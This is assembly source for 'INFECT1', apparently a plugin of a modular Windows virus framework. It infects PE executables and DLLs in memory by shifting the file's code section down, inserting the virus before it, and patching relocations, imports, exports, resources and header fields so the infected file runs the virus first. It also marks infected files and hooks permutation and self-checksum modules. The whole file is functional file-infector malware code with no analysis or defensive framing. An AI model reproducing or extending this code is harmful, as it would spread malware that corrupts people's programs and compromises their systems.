   ; INFECT1
   ; ~~~~~~~
   ; - first-section in-memory file infector

   ;
   ;     OLD FILE:         NEW FILE:               Infection Method:
   ;   (PE exe/dll)                                ~~~~~~~~~~~~~~~~~
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ MZ-header    ³  ³ MZ-header    ³   þ 2nd part of file (from CODE section)
   ; ³ PE-header    ³  ³ PE-header    ³     is displaced down
   ; ³ object table ³  ³ object table ³  Úþ virus is inserted into file between
   ; ÃÄ.CODEÄÄÄÄÄÄÄÄ´  ÃÄ.CODEÄÄÄÄÄÄÄÄ´  ³    end-of-headers and first section
   ; ³ [CODE]       ³¿ ³ [VIRUS]      ³Ä´þ file to infect must have relocations
   ; ³ old_entry:   ³³ ³ new_entry:   ³Ä´þ all relocations within all the file
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´³ ³ jmp old_entry³ÄÙ    are modified
   ; ³ .DATA, ...   ³³ Ã- - - - - - - ´   þ PE hdr & .reloc section are modified
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÀ³ [CODE]       ³   þ resources (.rsrc), imports/exports
   ;                   ³ old_entry:   ³       are modified if present
   ;                   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   þ all file io using FileMapping
   ;                   ³ .DATA, ...   ³   þ datetime/file attribs are preserved,
   ;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     except time is increased by 2 sec.
   ;

   include                 INCLUDE\consts.inc
   include                 INCLUDE\mz.inc
   include                 INCLUDE\pe.inc
   include                 infmanx.inc
   include                 loader.inc
   include                 pervert.inc
   include                 selfcorr.inc

   include                 plugin.inc
                           PLUGIN_START    INFECT1, CODE32, PERMUTABLE

   handleevent:            hookevent EV_INFMANX_INFECTINMEM, infcaller
                           stc
                           retn

   infcaller:              push    [edx].dword ptr 5*4
                           push    [edx].dword ptr 4*4
                           push    [edx].dword ptr 3*4
                           push    [edx].dword ptr 2*4
                           push    [edx].dword ptr 1*4
                           push    [edx].dword ptr 0*4
                           call    infect_file_in_memory

                           SKIPLOADER              ; 'coz need to return CF
                           retn

   ; subroutine: infect_file_in_memory
   ; input:      on the stack
   ; output:     CF=0  -- file infected, EAX = new file size
   ;             CF=1  -- alredy infected or an error occured

   infect_file_in_memory   proc    pascal

                           arg     _vir_old_eip      ; old eip ptr (rel2_vir_start)
                           arg     _vir_entry        ; vir entry (rel2_vir_start)
                           arg     _vir_size         ; vir size
                           arg     _vir_start        ; vir start
                           arg     _size             ; *size
                           arg     _fileptr          ; *data

                           local   _vir_size_aligned
                           local   _objtableptr
                           local   _resourcebase
                           local   _orig_size
                           local   _lastoeptr

                           pusha

                           mov     esi, _fileptr

                           mov     edi, [esi].mz_neptr
                           cmp     edi, _size
                           jae     __error

                           add     edi, esi

                           mov     eax, [edi]
                           neg     eax
                           cmp     eax, -'EP'
                           jne     __error

                           test    [edi].pe_exeflags, 0001h  ; no_relocs?
                           jnz     __error

   ; calculate object table offset
                           movzx   eax, [edi].pe_ntheadersize
                           lea     eax, [edi+eax+18h]
                           mov     _objtableptr, eax

                           ; phys size == real size ?   -- check overlay
                           movzx   ecx, [edi].pe_numofobjects
                           dec     ecx
                           imul    ecx, size oe_struc
                           add     ecx, eax

                           mov     _lastoeptr, ecx

                           mov     eax, [ecx].oe_phys_offs
                           add     eax, [ecx].oe_phys_size

                           sub     eax, _size
                           neg     eax        ; abs(eax)
                           jl      $-2        ;
                           ;;
                           cmp     eax, [edi].pe_filealign
                           jae     __error
                           ;;

                           xor     eax, eax
                           cmp     [edi].pe_entrypointrva, eax
                           je      __error
                           cmp     [edi].pe_importtablerva, eax
                           je      __error
                           movzx   eax, [edi].pe_numofobjects
                           cmp     eax, 2                     ; min 2 sections
                           jb      __error

   ; *** 'alredy-infected?'-check is here ***
                           cmp     [edi].pe_linkminor, 14
                           je      __error
                           mov     [edi].pe_linkminor, 14

   ;;;; very, very important command! use it to avoid usage of "bound imports"
   ;;;; i.e. if some NOT infected file uses direct addresses from the current
   ;;;; infected DLL
                           mov     [edi].pe_datetime, 0
   ;;;;

   ; selfcorr: increase virsize

                           pusha
                           mov     ecx, _vir_size
                           mov     _orig_size, ecx
                           eventX  EV_SELFCORR_CSUM_GET_SIZE
                           jc      __nsc1
                           add     _vir_size, ecx
   __nsc1:                 popa

   ; calculate file-and-object-aligned _vir_size

                           mov     eax, _vir_size

                           mov     ecx, [edi].pe_filealign
                           dec     ecx
                           add     eax, ecx
                           not     ecx
                           and     eax, ecx

                           mov     ecx, [edi].pe_objectalign
                           dec     ecx
                           add     eax, ecx
                           not     ecx
                           and     eax, ecx

                           mov     _vir_size_aligned, eax

   ; infecting. WARNING: after any modification, no way to 'Jxx __error' there

   ; call pervertor (if present)

                           pusha
                           push    [edi].pe_entrypointrva
                           call    __virt2phys
                           pop     esi
                           eventX  EV_INFECT1_AT_ENTRY
                           popa

   ;----------------------------------------------------------------------------

   ; fix resources (.rsrc) if present
                           cmp     [edi].pe_resourcetablerva, 0
                           je      __skipfixres

                           push    [edi].pe_resourcetablerva
                           call    __virt2phys
                           pop     edx
                           mov     _resourcebase, edx
                           call    __fix_rsrc
   __skipfixres:

   ; fix relocs
                           push    [edi].pe_fixuptablerva
                           call    __virt2phys
                           pop     ebx

                           mov     edx, [edi].pe_fixuptablesize
                           add     edx, ebx

   __rel_cycle:            pusha

                           push    dword ptr [ebx]
                           call    __virt2phys
                           pop     esi

                           mov     ecx, [ebx+4]
                           sub     ecx, 8
                           add     ebx, 8

   __rel_fix:              or      ecx, ecx
                           jz      __rel_end

                           mov     eax, [ebx]
                           shr     ah, 4
                           cmp     ah, 3
                           jne     __rel_skip

                           mov     eax, [ebx]
                           and     eax, 0FFFh

                           mov     edx, _vir_size_aligned
                           add     [esi+eax], edx
   __rel_skip:
                           add     ebx, 2
                           sub     ecx, 2
                           jmp     __rel_fix
   __rel_end:
                           popa

                           mov     eax, _vir_size_aligned  ; fix page rva
                           add     [ebx], eax

                           add     ebx, [ebx+4]
                           cmp     ebx, edx
                           jb      __rel_cycle

   ; fix import table

   ;+00  dd  im_lookup1-IMAGEBASE  ; im_lookuprva
   ;+04  dd  ?                     ; im_datetime
   ;+08  dd  -1                    ; im_forwardchain
   ;+0C  dd  im_nam1-IMAGEBASE     ; im_namerva
   ;+10  dd  im_tbl1-IMAGEBASE     ; im_addresstablerva

                           mov     ecx, [edi].pe_importtablerva
                           jecxz   __skipfiximp

                           push    ecx
                           call    __virt2phys
                           pop     ebx

                           mov     eax, _vir_size_aligned

   __imp_cycle:            mov     ecx, [ebx+0Ch]
                           or      ecx, [ebx+10h]
                           jz      __imp_exit

                           ; make 'unbound' imports
                           mov     dword ptr [ebx+04h], 0  ; datetime = 0

                           mov     ecx, [ebx+00h]
                           jecxz   __imp1_fixtbl_v2
                           add     [ebx+00h], eax
                           call    __fix0r
   __imp1_fixtbl_v2:
                           mov     ecx, [ebx+10h]
                           call    __fix0r

                           add     [ebx+0Ch], eax
                           add     [ebx+10h], eax

                           add     ebx, 14h
                           jmp     __imp_cycle

   __fix0r:                push    ecx
                           call    __virt2phys
                           pop     ecx

   __imp1_cycle:           cmp     dword ptr [ecx], 0
                           je      __imp1_exit
                           bt      dword ptr [ecx], 31     ; ordinal?
                           jc      __skipfixit
                           add     [ecx], eax
   __skipfixit:            add     ecx, 4
                           jmp     __imp1_cycle
   __imp1_exit:
                           retn

   __imp_exit:
   __skipfiximp:

   ; fix export table
                           mov     ecx, [edi].pe_exporttablerva
                           jecxz   __skipfixexp

                           push    ecx
                           call    __virt2phys
                           pop     ebx

                           mov     eax, _vir_size_aligned
                           add     [ebx].ex_namerva, eax

                           push    [ebx].ex_addresstablerva
                           call    __virt2phys
                           pop     edx
                           mov     ecx, [ebx].ex_numoffunctions
                           jecxz   __fixexp1x
   __fixexp1:              cmp     dword ptr [edx],0
                           je      __skipexp1
                           add     [edx], eax
   __skipexp1:             add     edx, 4
                           loop    __fixexp1
   __fixexp1x:
                           push    [ebx].ex_namepointersrva
                           call    __virt2phys
                           pop     edx
                           mov     ecx, [ebx].ex_numofnamepointers
                           jecxz   __fixexp2x
   __fixexp2:              cmp     dword ptr [edx],0
                           je      __skipexp2
                           add     [edx], eax
   __skipexp2:             add     edx, 4
                           loop    __fixexp2
   __fixexp2x:
                           add     [ebx].ex_addresstablerva, eax
                           add     [ebx].ex_namepointersrva, eax
                           add     [ebx].ex_ordinaltablerva, eax
   __skipfixexp:

   ; fix object table
                           mov     ebx, _objtableptr
                           movzx   ecx, [edi].pe_numofobjects ; ecx = objcount

                           mov     eax, _vir_size_aligned
                           add     [ebx].oe_phys_size, eax
                           add     [ebx].oe_virt_size, eax

   __obj_cycle:            add     ebx, size oe_struc
                           dec     ecx
                           jz      __obj_end
                           add     [ebx].oe_phys_offs, eax
                           add     [ebx].oe_virt_rva, eax
                           jmp     __obj_cycle
   __obj_end:

   ; fix entrypointrva
                           mov     eax, _vir_size_aligned
                           add     [edi].pe_entrypointrva, eax

   ; fix other PE header entries

                           add     [edi].pe_sizeofcode, eax
                           add     [edi].pe_imagesize, eax
                           add     [edi].pe_baseofdatarva, eax

                           add     [edi].pe_stackreservesize, INC_STACK

   ; fix PE rvas
                           lea     ebx, [edi].pe_rvasizes
                           mov     ecx, [edi].pe_numofrvaandsizes
                           mov     eax, _vir_size_aligned

   __rva_cycle:            cmp     dword ptr [ebx], 0
                           je      __rva_skip
                           add     dword ptr [ebx], eax

   __rva_skip:             add     ebx, 8
                           loop    __rva_cycle

   ; move 2nd part of file forward

                           pusha

                           mov     ecx, _size
                           mov     eax, _objtableptr
                           sub     ecx, [eax].oe_phys_offs

                           add     esi, _size
                           mov     edi, esi
                           add     edi, _vir_size_aligned

                           dec     esi
                           dec     edi

                           std
                           rep     movsb
                           cld

   ; copy our code into file
                           mov     edi, _objtableptr
                           mov     edi, [edi].oe_phys_offs
                           add     edi, _fileptr
                           mov     esi, _vir_start
                           mov     ecx, _vir_size
                           rep     movsb
                           mov     ecx, _vir_size_aligned
                           sub     ecx, _vir_size
                           xor     eax, eax
                           rep     stosb
                           popa

   ; set our entrypoint

                           mov     eax, _objtableptr
                           mov     eax, [eax].oe_virt_rva
                           mov     edx, eax
                           add     edx, _vir_entry
                           xchg    edx, [edi].pe_entrypointrva

                           add     eax, _vir_old_eip
                           sub     edx, eax
                           sub     edx, 4

                           push    eax
                           call    __virt2phys
                           pop     eax

                           mov     [eax], edx

   ; set popa.EAX = new file size
                           mov     eax, _size
                           add     eax, _vir_size_aligned
                           mov     [esp].popa_eax, eax

                           pusha
                           mov     ebx, _fileptr
                           mov     esi, _objtableptr
                           mov     esi, [esi].oe_virt_rva
                           eventX  EV_INFECT1_HOOK
                           popa

   ; selfcorr - do csum
                           pusha
                           mov     esi, _objtableptr
                           mov     esi, [esi].oe_phys_offs
                           add     esi, _fileptr
                           mov     ecx, _orig_size
                           lea     edi, [esi+ecx]          ; EDI=csum data
                           eventX  EV_SELFCORR_CSUM_CREATE
                           popa

   ; return success (CF=0)
                           clc
                           jmp     __quit

   ; return error (CF=1)
   __error:                stc

   __quit:                 popa
                           ret

   __virt2phys:            pusha

                           mov     esi, [esp+32+4]

                           movzx   ecx, [edi].pe_numofobjects ; ecx = objcount
                           mov     ebx, _objtableptr

   __v2p_cycle:            mov     eax, esi
                           sub     eax, [ebx].oe_virt_rva
                           jc      __v2p_cont
                           cmp     eax, [ebx].oe_phys_size
                           jae     __v2p_cont
                           add     eax, [ebx].oe_phys_offs
                           xchg    esi, eax
                           clc
                           jmp     __v2p_exit

   __v2p_cont:             add     ebx, size oe_struc
                           dec     ecx
                           jnz     __v2p_cycle

                           stc

   __v2p_exit:             add     esi, _fileptr
                           mov     [esp+32+4], esi

                           popa
                           retn

   ; input: EDX = rsrc offset

   __fix_rsrc:             movzx   ecx, word ptr [edx+0Ch]
                           movzx   eax, word ptr [edx+0Eh]
                           add     ecx, eax

                           lea     ebx, [edx+10h]

   __rsrc_cycle:           jecxz   __rsrc_end

                           mov     eax, [ebx+4]
                           btr     eax, 31
                           jnc     __x_data

                           pusha
                           mov     edx, eax
                           add     edx, _resourcebase
                           call    __fix_rsrc
                           popa

                           jmp     __x_both
   __x_data:
                           add     eax, _resourcebase
                           push    ecx
                           mov     ecx, _vir_size_aligned
                           add     [eax], ecx
                           pop     ecx
   __x_both:
                           add     ebx, 8
                           dec     ecx
                           jmp     __rsrc_cycle

   __rsrc_end:             retn

   ;----------------------------------------------------------------------------

   infect_file_in_memory   endp

                           PLUGIN_END
